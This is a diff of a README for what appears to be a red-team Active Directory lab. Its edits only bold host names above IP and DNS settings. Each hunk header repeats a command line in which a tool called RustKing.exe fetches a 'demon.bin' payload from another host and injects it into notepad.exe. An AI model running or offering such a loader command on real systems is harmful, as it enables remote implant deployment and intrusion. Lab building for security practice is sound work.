@@ -366,7 +366,7 @@ C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.ex
 ![image](https://user-images.githubusercontent.com/107750005/220043885-bd4ab66c-f78f-4d74-8d63-76f1f958ff43.png)
 
 ### Active Directory Network Addresses
-1. DC01
+1. **DC01**
     - Secure Network
         - Static IPv4: `10.10.101.131`
         - Subnet Mask: `255.255.255.0`
@@ -374,7 +374,7 @@ C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.ex
         - Preferred DNS: `127.0.0.1`
         - Alternate DNS: `8.8.8.8`
 
-2. WORKSTATION-01
+2. **WORKSTATION-01**
     - External Network
         - Dynamic IPv4: `192.168.25.149` (DHCP will assign)
         - Subnet Mask: `auto-assigned`
@@ -396,7 +396,7 @@ C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.ex
         - Preferred DNS: `10.10.101.131`
         - Alternate DNS: `8.8.8.8`
 
-3. WORKSTATION-02
+3. ****WORKSTATION-02**
     - Internal Network
         - Static IPv4: `10.10.100.129`
         - Subnet Mask: `255.255.255.0`
